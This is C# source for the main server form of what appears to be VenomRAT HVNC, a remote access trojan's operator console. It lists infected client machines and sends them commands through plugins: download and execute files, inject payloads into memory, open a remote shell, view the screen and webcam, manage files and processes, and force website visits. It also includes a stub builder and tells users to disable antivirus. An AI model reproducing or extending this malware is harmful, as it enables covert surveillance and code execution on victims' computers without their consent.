using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using cGeoIp;
using Microsoft.VisualBasic;
using Server.MessagePack;
using VenomRAT_HVNC.HVNC;
using VenomRAT_HVNC.Server.Algorithm;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Forms;
using VenomRAT_HVNC.Server.Handle_Packet;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            this.InitializeComponent();
            Form1.SetWindowTheme(this.listView1.Handle, "explorer", null);
            base.Opacity = 0.0;
        }

        private void CheckFiles()
        {
            try
            {
                if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config")))
                {
                    MessageBox.Show("Missing " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config");
                    Environment.Exit(0);
                }
                if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Client.exe")))
                {
                    MessageBox.Show("Missing client file, please close your Anti-Virus and unzip again.");
                }
                if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
                {
                    Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Venom RAT ", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
        }

        private Clients[] GetSelectedClients()
        {
            List<Clients> clientsList = new List<Clients>();
            base.Invoke(new MethodInvoker(delegate ()
            {
                object lockListviewClients = Settings.LockListviewClients;
                lock (lockListviewClients)
                {
                    if (this.listView1.SelectedItems.Count != 0)
                    {
                        foreach (object obj in this.listView1.SelectedItems)
                        {
                            ListViewItem listViewItem = (ListViewItem)obj;
                            clientsList.Add((Clients)listViewItem.Tag);
                        }
                    }
                }
            }));
            return clientsList.ToArray();
        }

        private Clients[] GetAllClients()
        {
            List<Clients> clientsList = new List<Clients>();
            base.Invoke(new MethodInvoker(delegate ()
            {
                object lockListviewClients = Settings.LockListviewClients;
                lock (lockListviewClients)
                {
                    if (this.listView1.Items.Count != 0)
                    {
                        foreach (object obj in this.listView1.Items)
                        {
                            ListViewItem listViewItem = (ListViewItem)obj;
                            clientsList.Add((Clients)listViewItem.Tag);
                        }
                    }
                }
            }));
            return clientsList.ToArray();
        }

        private async void Connect()
        {
            try
            {
                await Task.Delay(1000);
                string[] array = Properties.Settings.Default.Ports.Split(new char[] { ',' });
                foreach (string text in array)
                {
                    if (!string.IsNullOrWhiteSpace(text))
                    {
                        new Thread(new ParameterizedThreadStart(new Listener().Connect))
                        {
                            IsBackground = true
                        }.Start(Convert.ToInt32(text.ToString().Trim()));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            this.listView1.Columns[1].TextAlign = HorizontalAlignment.Center;
            this.listView1.Columns[2].TextAlign = HorizontalAlignment.Center;
            this.listView1.Columns[3].TextAlign = HorizontalAlignment.Center;
            this.listView1.Columns[4].TextAlign = HorizontalAlignment.Center;
            this.listView1.Columns[5].TextAlign = HorizontalAlignment.Center;
            this.listView1.Columns[6].TextAlign = HorizontalAlignment.Center;
            this.listView1.Columns[7].TextAlign = HorizontalAlignment.Center;
            this.listView1.Columns[8].TextAlign = HorizontalAlignment.Center;
            this.listView1.Columns[9].TextAlign = HorizontalAlignment.Center;
            this.listView1.Columns[10].TextAlign = HorizontalAlignment.Center;
            this.listView1.Columns[11].TextAlign = HorizontalAlignment.Center;
            this.listView1.Columns[12].TextAlign = HorizontalAlignment.Center;
            this.listView1.View = View.Details;
            this.listView1.HideSelection = false;
            this.listView1.OwnerDraw = true;
            this.listView1.BackColor = Color.FromArgb(24, 24, 24);
            this.listView1.DrawColumnHeader += delegate (object sender1, DrawListViewColumnHeaderEventArgs args)
            {
                Brush brush = new SolidBrush(Color.FromArgb(8, 104, 81));
                args.Graphics.FillRectangle(brush, args.Bounds);
                TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
            };
            this.listView1.DrawItem += delegate (object sender1, DrawListViewItemEventArgs args)
            {
                args.DrawDefault = true;
            };
            this.listView1.DrawSubItem += delegate (object sender1, DrawListViewSubItemEventArgs args)
            {
                args.DrawDefault = true;
            };
            ListviewDoubleBuffer.Enable(this.listView1);
            ListviewDoubleBuffer.Enable(this.listView33);
            try
            {
                foreach (string text in Properties.Settings.Default.txtBlocked.Split(new char[] { ',' }))
                {
                    if (!string.IsNullOrWhiteSpace(text))
                    {
                        Settings.Blocked.Add(text);
                    }
                }
            }
            catch
            {
            }
            this.CheckFiles();
            this.lvwColumnSorter = new ListViewColumnSorter();
            this.listView1.ListViewItemSorter = this.lvwColumnSorter;
            this.Text = Settings.Version ?? "";

            if (!File.Exists(Settings.CertificatePath))
            {
                using (FormCertificate formCertificate = new FormCertificate())
                {
                    int num = (int)formCertificate.ShowDialog();
                    this.ActiveControl = null;
                }
            }
            else
                Settings.ServerCertificate = new X509Certificate2(Settings.CertificatePath);

            using (FormPorts formPorts = new FormPorts())
            {
                formPorts.ShowDialog();
            }
            await Methods.FadeIn(this, 5);

            this.trans = true;
            if (Properties.Settings.Default.Notification)
            {
                this.toolStripStatusLabel2.ForeColor = Color.Gainsboro;
            }
            else
            {
                this.toolStripStatusLabel2.ForeColor = Color.Gainsboro;
            }
            new Thread(delegate ()
            {
                this.Connect();
            }).Start();
        }

        private void Form1_Activated(object sender, EventArgs e)
        {
            if (this.trans)
            {
                base.Opacity = 1.0;
            }
        }

        private void Form1_Deactivate(object sender, EventArgs e)
        {
            base.Opacity = 0.95;
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            this.notifyIcon1.Dispose();
            Environment.Exit(0);
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (this.listView1.Items.Count > 0 && e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                foreach (object obj in this.listView1.Items)
                {
                    ListViewItem listViewItem = (ListViewItem)obj;
                    listViewItem.Selected = true;
                }
            }
        }

        private void listView1_MouseMove(object sender, MouseEventArgs e)
        {
            if (this.listView1.Items.Count > 1)
            {
                ListViewHitTestInfo listViewHitTestInfo = this.listView1.HitTest(e.Location);
                if (e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null))
                {
                    this.listView1.Items[listViewHitTestInfo.Item.Index].Selected = true;
                }
            }
        }

        private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (e.Column == this.lvwColumnSorter.SortColumn)
            {
                if (this.lvwColumnSorter.Order == SortOrder.Ascending)
                {
                    this.lvwColumnSorter.Order = SortOrder.Descending;
                }
                else
                {
                    this.lvwColumnSorter.Order = SortOrder.Ascending;
                }
            }
            else
            {
                this.lvwColumnSorter.SortColumn = e.Column;
                this.lvwColumnSorter.Order = SortOrder.Ascending;
            }
            this.listView1.Sort();
        }

        private void ping_Tick(object sender, EventArgs e)
        {
            if (this.listView1.Items.Count > 0)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
                msgPack.ForcePathObject("Message").AsString = "This is a ping!";
                foreach (Clients @object in this.GetAllClients())
                {
                    ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
                }
                GC.Collect();
            }
        }

        private void UpdateUI_Tick(object sender, EventArgs e)
        {
            this.Text = Settings.Version + "     " + DateTime.Now.ToLongTimeString();
            object lockListviewClients = Settings.LockListviewClients;
            lock (lockListviewClients)
            {
                this.toolStripStatusLabel1.Text = string.Format("Online {0}                                 Selected Clients {1}                                      Sent {2}                                        Received  {3}                                         CPU {4}%                                      Memory {5}%", new object[]
                {
                    this.listView1.Items.Count.ToString(),
                    this.listView1.SelectedItems.Count.ToString(),
                    Methods.BytesToString(Settings.SentValue).ToString(),
                    Methods.BytesToString(Settings.ReceivedValue).ToString(),
                    (int)this.performanceCounter1.NextValue(),
                    (int)this.performanceCounter2.NextValue()
                });
            }
        }

        private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                object lockListviewLogs = Settings.LockListviewLogs;
                lock (lockListviewLogs)
                {
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.Items.Count > 0)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "thumbnails";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                foreach (Clients @object in this.GetAllClients())
                {
                    ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                }
            }
        }

        private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.Items.Count > 0)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "thumbnailsStop";
                    foreach (object obj in this.listView33.Items)
                    {
                        ListViewItem listViewItem = (ListViewItem)obj;
                        Clients @object = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
                    }
                }
                this.listView33.Items.Clear();
                this.ThumbnailImageList.Images.Clear();
                foreach (object obj2 in this.listView1.Items)
                {
                    ListViewItem listViewItem2 = (ListViewItem)obj2;
                    Clients clients = (Clients)listViewItem2.Tag;
                    clients.LV2 = null;
                }
            }
            catch
            {
            }
        }

        private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView44.SelectedItems.Count > 0)
            {
                foreach (object obj in this.listView44.SelectedItems)
                {
                    ListViewItem listViewItem = (ListViewItem)obj;
                    listViewItem.Remove();
                }
            }
        }

        private async void TimerTask_Tick(object sender, EventArgs e)
        {
            try
            {
                Clients[] clients = this.GetAllClients();
                if (Form1.getTasks.Count > 0 && clients.Length != 0)
                {
                    foreach (AsyncTask asyncTask in Form1.getTasks.ToList<AsyncTask>())
                    {
                        if (!this.GetListview(asyncTask.id))
                        {
                            Form1.getTasks.Remove(asyncTask);
                            return;
                        }
                        foreach (Clients clients2 in clients)
                        {
                            if (!asyncTask.doneClient.Contains(clients2.ID))
                            {
                                if (clients2.Admin)
                                {
                                    asyncTask.doneClient.Add(clients2.ID);
                                    this.SetExecution(asyncTask.id);
                                    ThreadPool.QueueUserWorkItem(new WaitCallback(clients2.Send), asyncTask.msgPack);
                                }
                                else if (!clients2.Admin && !asyncTask.admin)
                                {
                                    asyncTask.doneClient.Add(clients2.ID);
                                    this.SetExecution(asyncTask.id);
                                    ThreadPool.QueueUserWorkItem(new WaitCallback(clients2.Send), asyncTask.msgPack);
                                }
                            }
                        }
                        await Task.Delay(15000);
                    }
                    List<AsyncTask>.Enumerator enumerator = default(List<AsyncTask>.Enumerator);
                }
                clients = null;
            }
            catch
            {
            }
        }

        private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
                    msgPack.ForcePathObject("Update").AsString = "false";
                    msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                    msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    ListViewItem listViewItem = new ListViewItem();
                    listViewItem.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
                    listViewItem.SubItems.Add("0");
                    listViewItem.ToolTipText = Guid.NewGuid().ToString();
                    if (this.listView44.Items.Count > 0)
                    {
                        foreach (object obj in this.listView44.Items)
                        {
                            ListViewItem listViewItem2 = (ListViewItem)obj;
                            if (listViewItem2.Text == listViewItem.Text)
                            {
                                return;
                            }
                        }
                    }
                    Program.form1.listView44.Items.Add(listViewItem);
                    Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                    Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
                formSendFileToMemory.ShowDialog();
                if (formSendFileToMemory.toolStripStatusLabel1.Text.Length > 0 && formSendFileToMemory.toolStripStatusLabel1.ForeColor == Color.Green)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
                    msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
                    if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
                    {
                        msgPack.ForcePathObject("Inject").AsString = "";
                    }
                    else
                    {
                        msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
                    }
                    ListViewItem listViewItem = new ListViewItem();
                    listViewItem.Text = "SendMemory: " + Path.GetFileName(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString());
                    listViewItem.SubItems.Add("0");
                    listViewItem.ToolTipText = Guid.NewGuid().ToString();
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    if (this.listView44.Items.Count > 0)
                    {
                        foreach (object obj in this.listView44.Items)
                        {
                            ListViewItem listViewItem2 = (ListViewItem)obj;
                            if (listViewItem2.Text == listViewItem.Text)
                            {
                                return;
                            }
                        }
                    }
                    Program.form1.listView44.Items.Add(listViewItem);
                    Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                    Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
                }
                formSendFileToMemory.Close();
                formSendFileToMemory.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
                    msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                    msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
                    msgPack.ForcePathObject("Update").AsString = "true";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    ListViewItem listViewItem = new ListViewItem();
                    listViewItem.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
                    listViewItem.SubItems.Add("0");
                    listViewItem.ToolTipText = Guid.NewGuid().ToString();
                    if (this.listView44.Items.Count > 0)
                    {
                        foreach (object obj in this.listView44.Items)
                        {
                            ListViewItem listViewItem2 = (ListViewItem)obj;
                            if (listViewItem2.Text == listViewItem.Text)
                            {
                                return;
                            }
                        }
                    }
                    Program.form1.listView44.Items.Add(listViewItem);
                    Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                    Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private bool GetListview(string id)
        {
            foreach (object obj in Program.form1.listView44.Items)
            {
                ListViewItem listViewItem = (ListViewItem)obj;
                if (listViewItem.ToolTipText == id)
                {
                    return true;
                }
            }
            return false;
        }

        private void SetExecution(string id)
        {
            foreach (object obj in Program.form1.listView44.Items)
            {
                ListViewItem listViewItem = (ListViewItem)obj;
                if (listViewItem.ToolTipText == id)
                {
                    int num = Convert.ToInt32(listViewItem.SubItems[1].Text);
                    num++;
                    listViewItem.SubItems[1].Text = num.ToString();
                }
            }
        }

        [DllImport("uxtheme", CharSet = CharSet.Unicode)]
        public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

        private void builderToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            using (FormBuilder formBuilder = new FormBuilder())
            {
                formBuilder.ShowDialog();
            }
        }

        private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            using (FormAbout formAbout = new FormAbout())
            {
                formAbout.ShowDialog();
            }
        }

        private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "shell";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                foreach (Clients clients in this.GetSelectedClients())
                {
                    if ((FormShell)Application.OpenForms["shell:" + clients.ID] == null)
                    {
                        FormShell formShell = new FormShell
                        {
                            Name = "shell:" + clients.ID,
                            Text = "shell:" + clients.ID,
                            F = this
                        };
                        formShell.Show();
                        ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteDesktop.dll");
                foreach (Clients clients in this.GetSelectedClients())
                {
                    if ((FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + clients.ID] == null)
                    {
                        FormRemoteDesktop formRemoteDesktop = new FormRemoteDesktop
                        {
                            Name = "RemoteDesktop:" + clients.ID,
                            F = this,
                            Text = "RemoteDesktop:" + clients.ID,
                            ParentClient = clients,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "RemoteDesktop")
                        };
                        formRemoteDesktop.Show();
                        ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteCamera.dll");
                    foreach (Clients clients in this.GetSelectedClients())
                    {
                        if ((FormWebcam)Application.OpenForms["Webcam:" + clients.ID] == null)
                        {
                            FormWebcam formWebcam = new FormWebcam
                            {
                                Name = "Webcam:" + clients.ID,
                                F = this,
                                Text = "Webcam:" + clients.ID,
                                ParentClient = clients,
                                FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Camera")
                            };
                            formWebcam.Show();
                            ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileManager.dll");
                foreach (Clients clients in this.GetSelectedClients())
                {
                    if ((FormFileManager)Application.OpenForms["fileManager:" + clients.ID] == null)
                    {
                        FormFileManager formFileManager = new FormFileManager
                        {
                            Name = "fileManager:" + clients.ID,
                            Text = "fileManager:" + clients.ID,
                            F = this,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID)
                        };
                        formFileManager.Show();
                        ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ProcessManager.dll");
                foreach (Clients clients in this.GetSelectedClients())
                {
                    if ((FormProcessManager)Application.OpenForms["processManager:" + clients.ID] == null)
                    {
                        FormProcessManager formProcessManager = new FormProcessManager
                        {
                            Name = "processManager:" + clients.ID,
                            Text = "processManager:" + clients.ID,
                            F = this,
                            ParentClient = clients
                        };
                        formProcessManager.Show();
                        ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private async void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using OpenFileDialog openFileDialog = new OpenFileDialog();
                openFileDialog.Multiselect = true;
                if (openFileDialog.ShowDialog() != DialogResult.OK)
                {
                    return;
                }
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                packet.ForcePathObject("Update").AsString = "false";
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients client in selectedClients)
                {
                    client.LV.ForeColor = Color.Red;
                    string[] fileNames = openFileDialog.FileNames;
                    foreach (string file in fileNames)
                    {
                        await Task.Run(delegate
                        {
                            packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                            packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
                            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                        });
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void SendFileToMemoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
                formSendFileToMemory.ShowDialog();
                if (formSendFileToMemory.IsOK)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
                    msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
                    if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
                    {
                        msgPack.ForcePathObject("Inject").AsString = "";
                    }
                    else
                    {
                        msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
                    }
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients clients in this.GetSelectedClients())
                    {
                        clients.LV.ForeColor = Color.Red;
                        ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
                    }
                }
                formSendFileToMemory.Close();
                formSendFileToMemory.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string text = Interaction.InputBox("Message", "Message", "Controlled by DcRat", -1, -1);
                if (!string.IsNullOrEmpty(text))
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "sendMessage";
                    msgPack.ForcePathObject("Message").AsString = text;
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients @object in this.GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void VisteWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                string text = Interaction.InputBox("Visit website", "URL", "https://www.google.com", -1, -1);
                if (!string.IsNullOrEmpty(text))
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "visitURL";
                    msgPack.ForcePathObject("URL").AsString = text;
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
                    msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                    foreach (Clients @object in this.GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void ChangeWallpaperToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.SelectedItems.Count > 0)
                {
                    using (OpenFileDialog openFileDialog = new OpenFileDialog())
                    {
                        openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
                        if (openFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            MsgPack msgPack = new MsgPack();
                            msgPack.ForcePathObject("Pac_ket").AsString = "wallpaper";
                            msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
                            msgPack.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
                            MsgPack msgPack2 = new MsgPack();
                            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
                            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                            foreach (Clients @object in this.GetSelectedClients())
                            {
                                ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
        }

        private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
        {
        }

        private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
        {
        }

        private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "close";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                foreach (Clients @object in this.GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "restart";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                foreach (Clients @object in this.GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack2.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

